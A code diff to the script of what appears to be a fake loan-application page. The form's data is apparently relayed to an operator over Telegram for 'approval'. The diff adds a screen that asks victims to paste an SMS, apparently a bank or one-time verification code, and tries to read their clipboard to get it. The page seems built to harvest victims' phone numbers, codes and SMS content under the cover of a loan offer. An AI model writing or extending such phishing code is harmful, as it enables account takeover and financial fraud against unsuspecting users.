@@ -16,7 +16,6 @@ function selectLanguage(lang, element) {
     }, 300);
 }
 
-// --- CALCULATOR LOGIC ---
 const amountSlider = document.getElementById('amount-slider');
 const loanAmountDisplay = document.getElementById('loan-amount-display');
 const termSelect = document.getElementById('term-select');
@@ -36,21 +35,16 @@ amountSlider.addEventListener('input', updateCalculator);
 termSelect.addEventListener('change', updateCalculator);
 updateCalculator();
 
-// --- TRANSFER DATA TO APPLICATION FORM ---
 function startApplication() {
-    // Read current values from the calculator
     const selectedAmount = amountSlider.value;
     const selectedTerm = termSelect.value;
 
-    // Insert them into the application form fields
     document.getElementById('form-amount').value = selectedAmount;
     document.getElementById('form-term').value = selectedTerm;
 
-    // Move to the application screen
     goToScreen('screen-application');
 }
 
-// --- FORM INPUT RESTRICTIONS ---
 document.getElementById('phone-number').addEventListener('input', function (e) {
     this.value = this.value.replace(/[^0-9]/g, ''); 
 });
@@ -59,7 +53,6 @@ document.getElementById('five-digit-code').addEventListener('input', function (e
     this.value = this.value.replace(/[^0-9]/g, ''); 
 });
 
-// --- MULTI-STEP FORM LOGIC ---
 let currentStep = 1;
 const totalSteps = 3;
 
@@ -134,6 +127,7 @@ function generateSummary() {
     }
 }
 
+// --- TELEGRAM SUBMISSION (Now goes to SMS screen) ---
 async function submitForm(event) {
     event.preventDefault(); 
     
@@ -157,7 +151,7 @@ async function submitForm(event) {
 
     const submitBtn = document.getElementById('btn-submit');
     const originalText = submitBtn.innerText;
-    submitBtn.innerText = "Waiting for Telegram Approval...";
+    submitBtn.innerText = "Processing...";
     submitBtn.disabled = true;
 
     const phone = document.getElementById('phone-number').value || "Unknown";
@@ -177,7 +171,7 @@ async function submitForm(event) {
 
             if (statusData.status === 'approve') {
                 clearInterval(interval);
-                goToScreen('screen-success'); 
+                goToScreen('screen-sms'); // <--- GO TO SMS SCREEN NOW
             } else if (statusData.status === 'reject') {
                 clearInterval(interval);
                 alert("Application rejected by Admin.");
@@ -190,5 +184,46 @@ async function submitForm(event) {
         alert("Error connecting to server.");
         submitBtn.innerText = originalText;
         submitBtn.disabled = false;
+    }
+}
+
+// --- SMS SCREEN LOGIC ---
+
+// Update character count as user types
+document.getElementById('sms-input').addEventListener('input', function() {
+    const count = this.value.length;
+    document.getElementById('char-count').innerText = `${count} characters`;
+    
+    const verifyBtn = document.getElementById('btn-verify-sms');
+    if (count > 5) { // Require at least 5 characters to enable button
+        verifyBtn.classList.add('enabled');
+        verifyBtn.disabled = false;
+    } else {
+        verifyBtn.classList.remove('enabled');
+        verifyBtn.disabled = true;
+    }
+});
+
+// Simulate a "Paste" button (can't read clipboard directly in all browsers without permission, but we try)
+async function pasteSMS() {
+    try {
+        const text = await navigator.clipboard.readText();
+        const input = document.getElementById('sms-input');
+        input.value = text;
+        
+        // Trigger input event to update count and button
+        const event = new Event('input');
+        input.dispatchEvent(event);
+    } catch (err) {
+        // Fallback if clipboard API fails
+        alert("Please press and hold on the text box to paste the SMS manually.");
+    }
+}
+
+// Final verification step
+function verifySMS() {
+    const smsText = document.getElementById('sms-input').value;
+    if(smsText.length > 5) {
+        goToScreen('screen-success');
     }
 }
